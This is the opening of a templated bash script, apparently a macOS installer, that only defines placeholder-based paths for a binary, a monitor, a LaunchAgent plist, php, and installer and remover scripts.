#!/bin/bash

HASH={{USER_HASH}}
DIR_NAME="{{DIR_MAIN}}"
DIR_MAIN=$HOME/$DIR_NAME
DIR_BIN=$DIR_MAIN/{{DIR_BIN}}
BINARY=$DIR_BIN/{{FILE_MAIN_BINARY}}
BIN_ESC=`echo $BINARY | sed 's/[\\/&]/\\\\&/g'`
MONITOR=$DIR_BIN/monitor
MON_ESC=`echo $MONITOR | sed 's/[\\/&]/\\\\&/g'`
LAUNCH_DIR=$DIR_MAIN/{{DIR_AGENT}}
LAUNCH_PLIST=$LAUNCH_DIR/{{FILE_LAUNCH_PLIST}}.plist
PHP=`which php`
LOCAL_BIN={{DIR_LOCAL_BIN}}
INSTALLER=$LOCAL_BIN/{{FILE_INSTALLER}}
REMOVER=$LOCAL_BIN/{{FILE_REMOVER}}
